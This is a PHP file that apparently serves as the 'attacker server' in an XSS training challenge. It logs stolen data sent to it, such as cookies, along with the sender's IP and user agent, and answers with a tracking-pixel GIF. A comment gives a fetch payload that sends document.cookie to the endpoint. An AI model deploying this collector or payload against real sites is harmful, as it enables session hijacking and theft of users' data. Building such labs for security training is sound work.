<?php
/**
 * /collect.php  –  Attacker's exfil collection endpoint
 *
 * In the XSS challenge the player uses this URL as their "attacker server":
 *   fetch('/collect?c=' + encodeURIComponent(document.cookie))
 *
 * Data is written to /var/www/data/loot.json (one JSON line per hit).
 * View collected data at /loot.php
 */

$data = $_GET['c'] ?? $_POST['c'] ?? '';
$ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

if ($data !== '') {
    $entry = json_encode([
        'time' => date('Y-m-d H:i:s'),
        'ip'   => $ip,
        'ua'   => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'data' => $data,
    ]) . "\n";
    @file_put_contents('/var/www/data/loot.json', $entry, FILE_APPEND | LOCK_EX);
}

// Respond with a 1×1 transparent GIF so an <img> tag doesn't visually break
header('Content-Type: image/gif');
header('Cache-Control: no-store');
echo base64_decode('R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=');
